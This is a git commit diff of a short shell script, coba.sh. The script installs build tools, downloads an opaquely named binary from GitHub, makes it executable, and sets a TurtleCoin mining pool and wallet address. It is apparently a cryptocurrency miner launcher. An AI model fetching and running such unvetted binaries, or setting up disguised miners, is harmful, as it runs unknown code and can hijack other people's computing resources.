ea23d3caab096d4d6d6bb78ef83c69d2ee6b4a52
outbesok <89157467+outbesok@users.noreply.github.com>
2021-09-21 16:56:07 +0700

    Update coba.sh

--- coba.sh
+++ coba.sh
@@ -4,7 +4,7 @@ sudo apt update
 sudo apt install screen libjansson4 -y
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
-chmod +x ternak.sh && chmod +x obatkuat
+chmod +x coba.sh && chmod +x obatkuat
 screen -dmS ls
 A=us.turtlecoin.herominers.com:1160
 B=TRTLuxaMVkNaKUrey8Dh6tfKSzup58rRbdQFW6RGTR8dSy2VkY5tXbRAPLMuC44C3rZYGumcAuFKjFktTEGV9Z5wRvnjnxzaxvR
